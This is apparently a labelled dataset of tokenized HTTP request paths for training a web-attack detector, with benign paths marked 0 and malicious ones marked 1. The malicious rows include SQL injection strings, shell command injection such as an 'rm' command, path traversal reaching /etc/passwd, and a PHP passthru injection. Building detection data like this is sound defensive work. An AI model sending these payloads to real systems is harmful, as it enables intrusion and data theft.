request	label
/ ctg-digitalversion / 	0
/ 100799 / 	0
/ recordings / theme / global . css 	0
/ 0151206 / 	0
/ string / strings / parameters = 35470 	0
/ javascript / fusion . exe 	1
/ string / strings / parameters = 1 '  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ' jiyx '  =  ' jiyx 	1
/ msg328968 / 	0
/ javascript / jmxsoapadapter . so 	0
/ privsearch / 	0
/ string / modo = registro & login =  + vonnie & password = llanisca & nombre = onella & apellidos = wiedeman + naln & email = sirichanya @ vinavilano . pe & dni = 97036086y & direccion = calle + yela + utrilla + 150 +  & ciudad = villanueva + del + trabuco & cp = 37450 & provincia = mlaga & ntc = 3862460916827849 & b1 = registrar 	1
/ javascript / snoop . bin 	0
"/ string / strings / parameters = 1 ""  ""  ; select case when 7717 = 7717 then 1 else null end -- "	1
/ examples / jsp / error / cwmail . exe 	1
/ string / strings / parameters = banchieri romaguer 	0
/ string / strings / parameters = zalzale1 	0
/ ourassociation_off / 	0
/  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  { file } 	1
/ top . php ? stuff =  '  ; rm \ x09q48683432 \ x09 # 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo atdeso )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1 "	1
/ gu4ojkow . asmx 	0
/ string / strings / parameters = magdiel 	0
/ privatecharterflights / 	0
/ ukrules / 	0
/ deadcosm / 	0
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  { file } 	1
/ total extreme wrestling 2005_information / 	0
/  { file } 	1
/ 100088 / 	0
/ en-us / account / cal_make . pl ? p0 =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ a179112 / 	0
/ string / strings / parameters = 1 and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  -- 	1
/ rumseysm / 	0
/ string / strings / parameters = nadav6 	0
/ string / strings / parameters = 46660 	0
/ manager / nucleus / libs / pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00 	1
/ fast-facts / 	0
/ ccdisc / 	0
/ include / include_top . php ? g_include = xxpathxx 	1
/ phpmyadmin / www / delivery / ac . php ? bannerid = -1331904221 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_ucypkczy ]  )  )  ; die ;  /  * 	1
